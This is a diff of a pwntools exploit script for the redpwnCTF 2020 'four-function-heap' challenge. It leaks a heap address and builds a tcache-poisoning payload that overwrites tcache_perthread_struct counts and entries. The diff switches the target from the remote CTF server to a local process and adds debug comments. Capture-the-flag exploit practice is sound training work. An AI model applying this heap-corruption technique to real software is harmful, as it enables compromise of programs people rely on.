@@ -16,8 +16,8 @@ def show():
     return p.recvuntil('free}}')
 
 #context.update(log_level='debug')
-#p = process('bin/four-function-heap')
-p = remote('2020.redpwnc.tf', 31774)
+p = process('bin/four-function-heap')
+#p = remote('2020.redpwnc.tf', 31774)
 size1 = 0x200
 new(size1, 'A'*299) #0
 for i in range(2):
@@ -26,12 +26,15 @@ addr_heap = u64(show().split('{{')[0][-7:-1].ljust(8, '\x00'))
 addr_heapBase = addr_heap - 0x260
 log.info('heap : ' + hex(addr_heap))
 
+raw_input('debug: ' + str(p.pid))
 new(size1, p64(addr_heapBase + 0x10))#3
 new(size1, p64(addr_heap)*0x20)#4
 
 max_bins = 64
+#overwrite tcache_perthread_struct.counts
 payload = '\x00'*((size1 / 0x10) - 1) + '\x07'*5
 payload += '\x00'*(max_bins - len(payload))
+#overwrite tcache_perthread_struct.entries
 payload += p64(0)*((size1 / 0x10) -1) + p64(addr_heap)*5
 new(size1, payload)#5
 delete()#6
